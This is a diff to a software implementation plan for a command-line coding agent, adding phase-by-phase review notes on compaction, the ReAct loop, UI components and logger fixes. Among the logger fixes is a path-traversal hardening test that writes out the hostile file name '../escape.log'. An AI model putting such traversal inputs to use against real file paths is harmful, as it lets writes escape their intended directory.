+> - **`MICRO_COMPACTED_PLACEHOLDER` constant.** Magic string `'[micro-compacted]'` extracted as a top-level exported constant. Source uses it; tests can optionally import it.
+> - **Metadata-retention test.** Patrick specifically asked that `tool_use_id`, `command`, and `is_error` be strictly cloned (not mutated in place). New `microCompactor.test.ts` test asserts the original tool message's fields are unchanged after `microCompact`.
+> - **Zone-agnostic dedup documentation test.** `toolOutputPruner.test.ts` adds a test where two `read_file` duplicates both fall inside the protected tail; documents that dedup-newest-wins overrides zone protection.
+>
+> **Pre-flagged inline fixes during implementation** (commits `46ee902` … `e30b7a5`):
+>
+> - **Null guard for `AssistantMessage.content`.** Plan's `estimateTokens(m.content)` would fail strict TypeScript since `content` is `string | null`. Fixed with `m.content !== null ? estimateTokens(m.content) : 0`.
+> - **`history[i]!` non-null assertions replaced.** Plan had three `!` assertions in `snipper.ts`; replaced with safe destructuring (`const m = history[i]; if (!m) break/continue`) per the `noUncheckedIndexedAccess` discipline established in earlier phases.
+> - **`snipper.test.ts` arithmetic recalibration.** Plan's `protectedTailTokens: 50` for the "removes runs of 3+" test placed the protected boundary at index 2, leaving only one unprotected error — the test wouldn't have actually exercised the snipping path. Recomputed to 25 so the test catches what it claims to.
+>
+> Reviewer's verdicts on Patrick's four priority asks:
+>
+> - **Boundary off-by-ones** — clean across all three layers. `Math.max(0, length - tail)` clamps correctly; `i < protectedFrom` and `i >= protectedFrom` are mutually exclusive and exhaustive; `computeProtectedStart`'s backward accumulation correctly guarantees "at least N tokens protected".
+> - **Boundary straddling** — clean. Inner-loop guard `runEnd < protectedFrom` halts the run accumulation AT the boundary; protected sub-runs are kept intact; runs straddling the boundary collapse only the unprotected portion and produce well-formed output.
+> - **Idempotence** — L2 idempotent (system-marker insertion is structurally protected); L3 idempotent (semantically; new references each call but identical values); L1 now idempotent after the guard fix above.
+> - **Metadata retention** — clean. Object-literal allocation in `microCompactor.ts` ensures fresh result, primitives are value-copied. Original message is provably unmutated (test added).
+>
+> Tests: 190 → 229 unit (+39 across this phase). Treat the code under `src/util/`, `src/orchestrator/compaction/`, and tests under `tests/unit/util/` + `tests/unit/compaction/` as the source of truth.
+>
+> **Phase 8 review follow-ups deferred to v2:**
+>
+> - Protected-tail unit unification: L1 (`toolOutputPruner`) and L3 (`microCompactor`) use `protectedTailMessages` (count); L2 (`snipper`) uses `protectedTailTokens` (token budget). Patrick's "latest 40,000 tokens" directive maps cleanly to L2; orchestrator (Phase 9) wires concrete values that approximate the boundary on L1+L3. v2 should unify on tokens for consistency.
+> - True `original` count preservation across multiple L1 invocations would require a separate metadata field on `ToolResult` (breaking change). v1's idempotence guard prevents the drift but doesn't preserve the true original size if some other code path also truncates content first.
+> - End-to-end pipeline test that chains L1 → L2 → L3 and verifies R10 strict ordering. Each layer is unit-tested in isolation; the composed pipeline is implicit and will land with the Phase 9 orchestrator wiring.
+> - `computeProtectedStart` is exported despite having no current external consumer — testability was the implementer's reason. Could be made non-exported in a future cleanup; cosmetic only.
+
+---
+
 ## Phase 9 — Orchestrator (context, QueryEngine, ReAct loop)
 
 ### Task 29: `context.ts` — environment sensing at session start
@@ -4002,6 +4263,41 @@ Expected: PASS — 1 test.
 git add src/orchestrator/reactLoop.ts tests/integration/reactLoop.test.ts
 git commit -m "feat(orchestrator): ReAct loop async generator with R2-aware history append"
 ```
+
+---
+
+> **Phase 9 review-iteration note:** During Phase 9 execution, code review surfaced one Important fix plus two locking-in tests applied beyond Tasks 29–31 specs (commit `baaaff1`). All standard priority asks plus Patrick's two extras (tool exception propagation, R2 edge cases) came back clean.
+>
+> - **Important: dead R2 `tool_calls` copy in `applyR2` rewrite branch.** The branch is only entered when `!hasToolCalls(m)`, but the rewrite path was conditionally copying `m.tool_calls` onto the rewritten message via `if (m.tool_calls) copy.tool_calls = m.tool_calls;`. In the edge case where `m.tool_calls === []`, the empty array was copied — producing an invalid wire shape for both V3 and V4 adapters. Line removed; rewrite now returns `{ role: 'assistant', content: m.content }` only.
+> - **Test added: ZodError → `is_error: true` end-to-end.** Tool whose Zod schema rejects the LLM-supplied args produces an `is_error` tool result with the validation error in `content`; the loop continues to the next turn. Path was correct by construction but had no dedicated integration test.
+> - **Test added: non-async sync-throw recovery.** Tool registered with a non-async `run()` that throws synchronously is caught by reactLoop's try/catch via `registry.invoke`'s async signature. Locks in the load-bearing safety net that turns every synchronous throw into a rejected Promise the outer `await` catches uniformly. Without it, a single typo in any tool's `run` body would crash the agent.
+>
+> **Patrick-mandated additive extensions during implementation** (commits `f47a36e`, `a7983d8`):
+>
+> - **`senseContext` extended with `gitStatus` + `dirEntries`.** `spawnCollect('git', ['status', '--porcelain'], cwd)` matches Phase 5's `spawn`-not-`exec` pattern; resolves to empty string on ENOENT or non-zero exit. `listDirEntries` returns `[]` on missing cwd. Three async ops run in `Promise.all`.
+> - **`runReactLoop` extended with `artifactStore?` + `artifactThresholdBytes?`** (default 4096). When `artifactStore` is provided, oversized tool results are offloaded via `MarkdownStore.storeArtifact` and the conversation log gets a compact pointer-format string: `[artifact:<id>] <bytes> bytes stored at <path>\npreview: <first 200 chars>`. Integration test verifies a 5,000-byte tool output with 1,000-byte threshold produces the pointer (not raw content) and the artifact file lands on disk.
+>
+> **Pre-flagged inline fixes during implementation:**
+>
+> - **Plan compaction test arithmetic was unreachable.** Task 30's plan test used `workingBudget: 200` with 10K-char content; 2,500 tokens at 1,250% of budget triggers `refuse` immediately. Recalibrated to `workingBudget: 800`, `maxToolOutputChars: 200`, `protectedTailMessages: 0`, content `'x'.repeat(2_400)` so the test exercises the prune path it claims to.
+> - **`proc.stdout` null guard** in `spawnCollect` per `noUncheckedIndexedAccess` (same pattern as Phase 5 `bashJob.ts`).
+> - **R2 destructure rewrite from `const { reasoning_content: _r, ...rest } = m`** to explicit reconstruction (avoids unused-var lint).
+>
+> Reviewer verdicts on the priority asks:
+>
+> - **Tool failure exception propagation** — ALL scenarios caught and recovered. `registry.invoke` being `async` is the universal safety net. Sync throw, async throw, `Promise.reject`, `ZodError`, `storeArtifact` rejection, re-entrant catch-handler exception, generator cleanup on consumer break — all clean.
+> - **R2 edge cases** — clean per-turn correctness. Empty `reasoning_content`, missing `tool_calls`, empty `tool_calls: []`, multiple consecutive assistant turns, mid-history vs tail all handled. Adapters' `serializeMessage` provides a belt-and-suspenders strip of empty `reasoning_content` at wire-format time.
+>
+> Tests: 229 → 254 unit (+25) plus 2 → 6 integration (+4 reactLoop tests). Treat the code under `src/orchestrator/` (`context.ts`, `QueryEngine.ts`, `reactLoop.ts`) and the corresponding tests as the source of truth.
+>
+> **Phase 9 review follow-ups deferred to v2:**
+>
+> - `context.ts` `spawnCollect`: no byte cap on stdout; orphaned-child cleanup on `!proc.stdout`; `gitStatus` empty-string ambiguity (clean repo vs not-a-repo vs git-not-installed all collapse to ''). All v1-acceptable.
+> - `reactLoop.ts` `pendingCalls` deduplication — trust StreamEvent contract for v1; add guard in v2 once real-world adapter behavior is confirmed.
+> - `reactLoop.ts` artifact preview sanitization — preview can contain DSML markup; LLMs handle arbitrary text robustly so v1 acceptable.
+> - `QueryEngine.snapshot()` returns shallow copy; callers can mutate `Message` objects. Deep-freeze or typed readonly wrapper for v2.
+> - `prepareRequest` recomputes the budget verdict on every call. v2 may cache.
+> - `applyR2` future-proofing via spread+delete (instead of explicit reconstruction) — would auto-preserve hypothetical future `AssistantMessage` fields. Cosmetic.
 
 ---
 
@@ -4825,6 +5121,45 @@ git commit -m "feat(ui): Clack onboarding flow (apiKey, adapter, model, prompt)"
 
 ---
 
+> **Phase 10 review-iteration note:** Phase 10 (Tasks 32–39) shipped via single implementer subagent (commits `4f87cad`–`a19ca9b`), Biome cleanup pass (`b84eecd`), then two-stage parallel review (spec compliance + code quality) returning `PASS` / `MINOR FIXES RECOMMENDED`. Five review fixes plus six new tests applied inline (`ba13363`). Treat the code under `src/ui/`, `src/util/logger.ts`, and tests under `tests/unit/ui/`, `tests/unit/util/` as the source of truth.
+>
+> **Pre-approved plan deviations (applied during implementation):**
+>
+> - **Task 33 parser**: `m[1]!` non-null assertions replaced with explicit destructuring + `if (... === undefined) continue` guards (`src/ui/markdown/incrementalParser.ts:29-31`). Phase 4–9 no-`!` pattern preserved.
+> - **Task 36 ContentStream test**: plan's JSX `text="hello\n\n# H1\n\n"` was a string literal that didn't interpret `\n` (parser saw 14 literal characters; heading-lock path was not exercised — false-positive pass via substring match). Corrected to `text={'hello\n\n# H1\n\n'}` (`tests/unit/ui/ContentStream.test.tsx:11`) so real newlines reach the parser.
+> - **Task 39 onboarding**: plan's `(await text({...})) as string` cast replaced with `promptText`/`promptSelect<T>` helpers that internally narrow Clack's `string | symbol` return via `isCancel` and return clean `string`/`T` (`src/ui/onboarding.ts:11-30`). Eliminates the `as string` papering over the cancel-symbol union.
+> - **Task 39 additive test**: plan said no test (Clack reads stdin, requires TTY); we mocked `@clack/prompts` via `vi.mock` and added two assertion tests covering both default-applied and default-skipped paths (`tests/unit/ui/onboarding.test.ts`).
+>
+> **Implementer-applied additional fixes (defensible judgment calls during implementation):**
+>
+> - `src/ui/markdown/MarkdownRenderer.tsx:22`: `const dim = dimmed === true` narrows `boolean | undefined` → `boolean` for `exactOptionalPropertyTypes` on Ink's `dimColor` prop.
+> - `src/ui/onboarding.ts:22`: `Array<{ value: T; label: string }>` (mutable) instead of `ReadonlyArray` because Clack's `SelectOptions` requires mutable.
+> - `tests/unit/ui/onboarding.test.ts:10`: mock matcher `'agent to do'` matches `'What would you like the agent to do?'` reliably (initial `'would like'` was a non-contiguous substring).
+> - `src/ui/markdown/MarkdownRenderer.tsx:13`: `biome-ignore lint/suspicious/noArrayIndexKey` with rationale comment — completed blocks are append-only and never reordered, so index-as-key is stable.
+>
+> **Two-stage review fixes applied inline (commit `ba13363`):**
+>
+> - **M1 — Logger error-chain poisoning**: a single `mkdir`/`appendFile` rejection silently dropped all subsequent writes for the rest of the session, since `pending = pending.then(...)` left the chain in a rejected state. Wrapped with a trailing `.catch(() => {})` so the chain stays fulfilled; failing batches are dropped, not retried (`src/util/logger.ts:37-44`). Test: chain stays alive across two `flush()` calls under ENOTDIR.
+> - **m1 — Logger circular-reference throws**: `JSON.stringify` on a circular entry threw synchronously into the caller's fire-and-forget call. `safeStringify` wraps in try/catch and emits `{ msg: '[unserializable]' }` placeholder (`src/util/logger.ts:14-20`). Tests: no-throw + placeholder emitted.
+> - **m2 — Logger path traversal**: `opts.file` was unsanitised; a `'../escape.log'` argument escaped `logsDir`. `basename(opts.file ?? 'session.log')` strips path components (`src/util/logger.ts:24`). Test: `'../escape.log'` lands in `logsDir/escape.log`.
+> - **M2 — ApprovalPrompt double-fire**: `useInput` may receive multiple keypresses before React unmounts the component; HitlGate's Promise drops second resolves but the "exactly once per mount" contract was violated at the component layer. `useRef<boolean> firedRef` short-circuits after the first valid keypress (`src/ui/ApprovalPrompt.tsx:11-22`). Test: `y`/`y`/`n` stream fires once with `{ decision: 'approve' }`.
+> - **M3 — ReasoningBlock Tab-toggle unwired**: collapsed view advertised "press Tab to expand" but `App` never wired the handler — direct violation of CLAUDE.md U1 ("Toggleable via keyboard"). Added `useState<boolean>` for `reasoningExpanded` plus a `useInput` Tab handler in `App.tsx:24-27`, propagating `expanded` prop down to `ReasoningBlock`. Test: Tab toggles between collapsed and expanded frames; second Tab returns to collapsed.
+>
+> **Test-environment quirk worth knowing:** `ink-testing-library`'s `stdin` listener (`'readable'`) is attached inside Ink's `useEffect` via `setRawMode(true)`, which doesn't run until a microtask after `render()` returns. Tests that simulate keypresses must `await new Promise((r) => setTimeout(r, 50))` before the first `stdin.write(...)` to let the listener register, otherwise the keypress is dropped silently. Documented in `tests/unit/ui/{ApprovalPrompt,App}.test.tsx`.
+>
+> Tests: 254 → 272 unit (Tasks 32–39 + onboarding mock test, +18) → 278 unit (review fixes, +6). Typecheck and lint clean throughout.
+>
+> **Phase 10 follow-ups deferred to v2:**
+>
+> - `ContentStream` re-instantiates `IncrementalMarkdownParser` per render via `useMemo([text])`. Per-render is O(n) per the U2 contract; cumulative work over N chunks is O(n²). Plan-acknowledged tradeoff. v2: lift parser into `useRef` and feed only the delta.
+> - Logger I/O failures silently drop the failing batch. v2: optional `onError` hook so the orchestrator can surface failures (e.g., a UI banner via the alternate channel) without violating U4.
+> - `incrementalParser.ts` closes a code block on the first inline triple-backtick substring even inside streaming code (e.g. a string literal containing the fence). Plan-acknowledged limitation of the no-real-markdown-library choice.
+> - `App.tsx`'s `useInput` Tab handler also fires when `ApprovalPrompt` is mounted (Tab toggles reasoning even mid-approval). Harmless (Tab is not Y/N) but worth scoping later — possibly via `options.isActive`.
+> - `ReasoningBlock` renders negative `durationMs` as `-0.3s` on clock skew. Cosmetic.
+> - **R11 spec gap surfaced by spec reviewer (Phase 9 origin, not Phase 10 scope):** `CLAUDE.md` R11 promises `approve-once` and `reject-with-feedback` decisions, but `src/security/hitlGate.ts` `ApprovalResponse` type only exposes `approve`/`reject`. ApprovalPrompt correctly maps to the actual existing type. Closing the gap belongs in a v2 HITL refinement that extends both `ApprovalResponse` and the prompt's keyboard map.
+
+---
+
 ## Phase 11 — Wiring & Manual Smoke
 
 ### Task 40: `index.ts` — entry point wiring everything together
@@ -5006,6 +5341,30 @@ Note any FAIL items as new tasks; do not mark this checklist complete until ever
 git add docs/MANUAL_SMOKE.md
 git commit -m "docs: manual smoke verification checklist"
 ```
+
+---
+
+> **Phase 11 review-iteration note:** Phase 11 (Tasks 40–41) shipped via single implementer subagent (commits `97daa20`, `f2bfa23`), then two-stage parallel review (spec compliance + code quality). Spec review returned `PASS`; code quality returned `MINOR FIXES RECOMMENDED`. Three fixes applied inline (`570338d`). Treat the code in `src/index.ts` and `docs/MANUAL_SMOKE.md` as the source of truth.
+>
+> **Pre-approved plan deviations (applied during implementation):**
+>
+> - **`ev.cause.message` typing fix (`src/index.ts:101`):** plan line 5249 wrote `ev.cause.message` on `cause: unknown` (`src/adapters/streamEvent.ts:13`). Replaced with `ev.cause instanceof Error ? ev.cause.message : String(ev.cause)` for strict-mode compliance.
+> - **Explicit `cwd` thread (`src/index.ts:81`):** plan invocation didn't pass `cwd` to `runReactLoop`. Internally `reactLoop.ts:79` defaults to `process.cwd()`, so the explicit pass is cosmetic for behaviour, but the entry-point file is the top-level dependency-injection manifest — explicit threading documents intent and is robust to future internal changes.
+> - **`engine.snapshot().slice(1)` (`src/index.ts:110`):** plan's final `for (const m of engine.snapshot()) await conversation.appendTurn(m)` would have written the initial user turn twice (already written at `src/index.ts:55`). `.slice(1)` skips index 0 — the duplicate — while preserving the early write as crash-safety: if the loop crashes mid-stream, the user prompt is still on disk. Tradeoff (slightly uglier slice vs lost initial-turn record) was decided in favour of crash-safety because Markdown files are this architecture's definitive source of truth.
+>
+> **Two-stage review fixes applied inline (commit `570338d`):**
+>
+> - **M1 — `try/finally` around the loop (`src/index.ts:75-114`):** code-quality reviewer flagged that `QueryEngine.prepareRequest` can throw `CompactionRefusal` when the working budget exceeds 95% and layers 4–5 are deferred (per R10 + R12). Without `try/finally` that throw propagates uncaught through the `for await`, bypasses `ink.unmount()`, and lets `console.error` in `main().catch` write to stderr while Ink is still mounted — ANSI corruption, U4 violation. The Compaction smoke test (`WORKING_TOKEN_BUDGET=2000`) makes this a realistic path, not theoretical. Wrapped the loop + post-loop snapshot flush in `try`, with `await logger.flush()` and `ink.unmount()` in `finally`. On crash mid-loop, unflushed assistant turns are lost but the initial user turn (already written) is preserved — consistent with FIX #3's stance.
+> - **m1 — Module comment placement (`src/index.ts:1`):** Biome's import-sort moved `node:crypto` and `node:path` above the `// src/index.ts` comment on initial commit. Moved comment back to line 1 to match every other module's header convention.
+> - **m2 — HITL smoke items annotated as `[DEFERRED]` (`docs/MANUAL_SMOKE.md:26-29`):** the three HITL items required a registered bash tool to trigger `HitlGate.checkBash`, but only read/write/list/grep are wired in v1 and none route through the gate. Annotation prevents false failures during manual smoke. The items remain in the doc as v2 reminders.
+>
+> Tests: 278 unit + 2 skipped integration unchanged through the review-fix iteration. Typecheck and lint clean. Build produces `dist/index.js` (5520 bytes after try/finally).
+>
+> **Phase 11 follow-ups deferred to v2:**
+>
+> - HITL gate has no caller in v1. No bash tool is registered in `index.ts`, and the BullMQ bash worker (`src/queue/worker.ts`) does not call `HitlGate.checkBash`. Wiring requires both a registered `bash` tool and the corresponding `runReactLoop` hook. The smoke checklist's HITL items are kept with `[DEFERRED]` markers as v2 reminders rather than removed.
+> - The `O(n²)` markdown re-parse per render (`<ContentStream>` re-instantiates `IncrementalMarkdownParser` per render via `useMemo([text])`) — already in Phase 10's deferred list, not introduced by Phase 11.
+> - Logger I/O failures silently drop the failing batch — already in Phase 10's deferred list.
 
 ---
 
